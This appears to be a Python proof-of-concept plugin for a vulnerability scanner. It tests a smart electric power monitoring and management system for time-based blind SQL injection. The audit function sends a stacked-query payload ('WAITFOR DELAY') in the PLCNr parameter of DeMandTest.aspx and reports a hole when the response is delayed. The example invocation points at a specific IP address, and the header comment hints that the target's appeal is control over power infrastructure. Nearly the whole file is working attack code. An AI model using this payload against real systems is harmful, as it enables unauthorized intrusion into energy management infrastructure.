#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  智慧型電能監控管理系統通用sql注入1
Author    :  a
mail      :  a@lcx.cc
 电能监控 还有 管理 你懂的！！


/DeMandTest.aspx?B=0&Month=1&PLCNr=5*&MeterID=1
"""
import urlparse
import time

def assign(service, arg):
    if service == 'electric_monitor':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    start_time1=time.time()
    code1, head, res, errcode, _ = curl.curl2(arg)
    true_time=time.time()-start_time1
    start_time2=time.time()
    url = arg + "DeMandTest.aspx?B=0&Month=1&PLCNr=5;WAITFOR%20DELAY%20'0:0:6'--&MeterID=1"
    code2, head, res, errcode, _ = curl.curl2(url)
    flase_time=time.time()-start_time2
    if code1==200 and code2==500 and flase_time>true_time and flase_time>5 and true_time<2:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('electric_monitor', 'http://163.15.186.37/')[1])